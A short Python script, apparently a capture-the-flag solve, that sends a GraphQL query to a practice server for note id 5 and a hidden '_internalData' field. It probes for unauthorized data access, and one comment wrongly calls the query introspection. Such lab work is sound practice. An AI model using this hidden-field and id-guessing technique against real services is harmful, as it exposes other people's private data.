import requests

# Define the GraphQL endpoint URL
url = 'https://ctf-questions.onrender.com/'

# Define the introspection query
query_template = '''{
    noteById(id: "5") {
        id
        content
        _internalData
    }
}
  '''

# Set the request headers
headers = {
    'Content-Type': 'application/json',
}

# Create the request payload
data = {
    'query': query_template
}

# Send the POST request
response = requests.post(url, headers=headers, json=data)

# Check the response status code
if response.status_code == 200:
    # Parse and print the JSON response
    schema_info = response.json()
    print(schema_info)
else:
    # Print the error status and response text
    print(f"Error: {response.status_code}")
    print(response.text)